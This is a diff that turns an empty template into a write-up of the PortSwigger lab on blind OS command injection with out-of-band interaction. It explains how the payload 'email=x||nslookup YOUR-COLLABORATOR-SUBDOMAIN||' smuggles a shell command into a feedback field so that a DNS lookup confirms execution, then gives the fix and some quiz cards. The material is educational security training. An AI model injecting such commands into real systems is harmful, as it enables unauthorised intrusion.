@@ -1,39 +1,58 @@
 ---
 title: Blind OS command injection with out-of-band interaction
-date: '2025-06-18'
+date: '2026-07-11'
 tags:
   - PortSwigger
   - lab
   - command-injection
   - walkthrough
-excerpt: >-
-  PortSwigger Web Security Academy lab — Blind OS command injection with
-  out-of-band interaction. Walkthrough with solution, key takeaways, and blind
-  replay exercise.
+excerpt: "No output and no writable web path. So I make the server resolve a Burp Collaborator name and watch the lookup arrive."
 type: lab
 category: PortSwigger Academy
 platform: PortSwigger
-difficulty: apprentice
+difficulty: practitioner
 ---
 
 # Lab: Blind OS command injection with out-of-band interaction
 
-## Objective
+When the response tells you nothing and there is no file you can read back, the last reliable signal is outbound traffic to a host you control. This lab is that pivot, and it is the foundation for the data exfiltration lab that follows.
 
-*Describe the labs objective here*
+## The setup
 
-## Solution Reconstruction
+Feedback form again: `POST /feedback/submit`, `email` vulnerable, output discarded. There is no web-served directory you can write to here, so the redirection trick from the previous lab has nothing to target. The target does have outbound network access, which is the assumption every out-of-band attack depends on.
 
-- [ ] Step 1:
-- [ ] Step 2:
-- [ ] Step 3:
-- [ ] Final payload / exploit:
+## How the vulnerability works
 
-## Key Takeaway
+The injected command inherits the network access of the web server. If it makes a DNS or HTTP request to a domain whose name servers belong to you, the request itself is the evidence: it can only have come from your command. Burp Collaborator gives you exactly that, a unique subdomain on Burp's name servers plus an HTTP listener, with every lookup logged.
 
-*Write ONE principle I must remember*
+This works even when there is no readable output, because the leak is the access itself.
 
-## Next-Day Blind Replay
+## Solving it
 
-- [ ] Solved entirely from memory
-- [ ] Needed to look at: *(write the specific step forgotten)*
+1. Open the Burp Collaborator client and click "Copy to clipboard" to get a payload subdomain. It is unique to you and changes each time you generate one.
+2. Inject a command that resolves it:
+
+```
+email=x||nslookup YOUR-COLLABORATOR-SUBDOMAIN||
+```
+
+3. Send the request.
+4. Return to the Collaborator tab and click "Poll now". A DNS lookup from the target appears within a few seconds.
+
+## Why that payload works
+
+`nslookup <name>` makes the target's resolver ask for that name. The authoritative name server for the Collaborator domain is Burp's, so the query reaches Burp and is logged with the source IP of the target. That is a direct hit: the shell ran, and it ran `nslookup`.
+
+The important property is uniqueness. The subdomain was generated for this attempt, so a logged lookup for it cannot be incidental traffic. The only way it gets requested is through your injected command.
+
+## The fix
+
+Same cause as the timing and redirection labs: user input is concatenated into a shell command. Build the command from an argument list instead, with no shell involved, and validate the field as what it should be, an email address. Restrict the host's outbound egress so a hijacked command cannot reach arbitrary names.
+
+<FlipCard front={<div>There is no output and no writable web path. How do you confirm the injected command ran?</div>} back={<div>Make the command resolve a Burp Collaborator subdomain. The DNS lookup arrives at Burp's name servers, which proves the shell executed.</div>} />
+
+<QuizCard title="Out-of-band checks" questions={[
+  { question: "Why does a Collaborator DNS lookup prove the injection worked?", options: ["It slows the response down", "The unique subdomain can only be requested by your injected command, and the query reaches name servers you control", "It changes the status code", "It stores output in a cookie"], correct: 1, explanation: "Nothing else would ever ask for that freshly generated name. Its arrival is direct evidence the server ran your command." },
+  { question: "Why is out-of-band preferred over a time delay on this lab?", options: ["Timing is blocked by a firewall", "The lab has no sleep binary", "Out-of-band also works when the response is slow or asynchronous, and it is what this lab targets", "A delay would not change the response time"], correct: 2, explanation: "Timing still works as a signal in general, but out-of-band stays reliable when timing does not, and it is the technique this lab is about." },
+  { question: "What does the target need for this to work?", options: ["A public IP", "Outbound network access to the Collaborator name servers", "An open port 80", "Write access to the web root"], correct: 1, explanation: "The whole channel is a request leaving the target. If the host has no egress, there is nothing to observe." }
+]} />
